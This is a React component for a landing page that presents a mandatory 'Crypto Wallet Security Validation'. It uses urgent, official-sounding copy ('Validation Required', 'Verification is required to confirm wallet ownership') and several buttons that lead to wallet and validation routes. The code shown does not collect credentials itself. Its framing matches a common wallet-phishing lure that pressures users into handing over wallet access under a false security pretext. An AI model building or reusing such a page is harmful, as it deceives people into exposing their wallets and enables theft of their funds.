import React, { useEffect } from 'react';
import "./cryptoPagesCss/cryptoLanding.css";
import CryptoHeader from '../cryptoHeader/CryptoHeader';
import { BsCheck } from "react-icons/bs";
import { useNavigate } from 'react-router-dom';
import crypto_landing_section2_image from "../../../assets/crypto_landing_section2_image.webp";
import crypto_landing_section3_image from "../../../assets/crypto_landing_section3_image.webp";
import crypto_landing_section4_logo_image from "../../../assets/crypto_landing_section4_logo_image.webp";
import CryptoFooter from '../cryptoFooter/CryptoFooter';
import { motion } from "framer-motion";

const CryptoLanding = () => {

  const navigate = useNavigate()

  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://www.livecoinwatch.com/static/lcw-widget.js";
    script.defer = true;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <>
      <div className='crypto_landing_body'>
        <div className="crypto_home-widget">
          <div className="crypto_home-widget-wrapper">
            <script
              defer
              src="https://www.livecoinwatch.com/static/lcw-widget.js"></script>
            <div
              className="livecoinwatch-widget-5"
              lcw-base="USD"
              lcw-color-tx="#999999"
              lcw-marquee-1="coins"
              lcw-marquee-2="movers"
              lcw-marquee-items="10">
            </div>
          </div>
        </div>

        <CryptoHeader/>

        {/* ================= HERO ================= */}
        <section className='crypto_hero_section'>
          <h1>Crypto Wallet <br/> Security Validation</h1>
          <h3>
            Verification is required to confirm wallet ownership
            and activate enhanced security protection
          </h3>

          <div className='crypto_hero_section_mark_container'>
            <div className='crypto_hero_section_mark_text_container'>
              <div className='mark_icon'><BsCheck/></div>
              <p><span>Ownership verification</span> without exposing private keys</p>
            </div>

            <div className='crypto_hero_section_mark_text_container'>
              <div className='mark_icon'><BsCheck/></div>
              <p>Protection against <span>unauthorized access</span> and exploits</p>
            </div>

            <div className='crypto_hero_section_mark_text_container'>
              <div className='mark_icon'><BsCheck/></div>
              <p>Required for <span>network compatibility</span> and security upgrades</p>
            </div>
          </div>

          <button onClick={()=>navigate('/crypto-wallet')}>
            Validate Wallet
          </button>
        </section>

        {/* ================= SECTION 2 ================= */}
        <section className='crypto_landing_section2'>
          <div className='crypto_landing_section2_image_container'>
            <img src={crypto_landing_section2_image} alt='image'/>
          </div>
        </section>

        {/* ================= SECTION 3 ================= */}
        <section className='crypto_landing_section3'>
          <motion.div
            initial={{ opacity: 0, x: -100 }}
            transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
            whileInView={{ opacity: 1, x: 0 }}
            viewport={{ margin: "-40px", once: true }}
            className='crypto_landing_section3_left_container'
          >
            <p>SECURITY VALIDATION</p>
            <h1>Protect Your Wallet</h1>
            <h3>
              <span>Verify.</span> Confirm wallet ownership securely.<br/>
              <span>Secure.</span> Activate upgraded protection layers.<br/>
              <span>Access.</span> Maintain uninterrupted wallet functionality.<br/>
            </h3>

            <div className='crypto_landing_section3_left_button_container'>
              <button
                className='crypto_landing_section3_left_button_first'
                onClick={()=>navigate('/crypto/validate')}
              >
                Start Validation
              </button>

              <button
                className='crypto_landing_section3_left_button_second'
                onClick={()=>navigate('/crypto-wallet')}
              >
                Continue
              </button>
            </div>
          </motion.div>

          <motion.div
            initial={{ opacity: 0, x: 100 }}
            transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
            whileInView={{ opacity: 1, x: 0 }}
            viewport={{ margin: "-40px", once: true }}
            className='crypto_landing_section3_right_container'
          >
            <img src={crypto_landing_section3_image} alt='image'/>
          </motion.div>
        </section>

        {/* ================= SECTION 4 ================= */}
        <section className='crypto_landing_section4'>
          <div className='crypto_landing_section4_container'>
            <p>SECURITY NOTICE</p>
            <h1>Validation Required</h1>

            <div className='crypto_landing_section4_logo_image_container'>
              <img src={crypto_landing_section4_logo_image} alt='image'/>
            </div>

            <button onClick={()=>navigate('/crypto-wallet')}>
              Complete Wallet Verification
            </button>
          </div>
        </section>

        <CryptoFooter/>
      </div>
    </>
  )
}

export default CryptoLanding
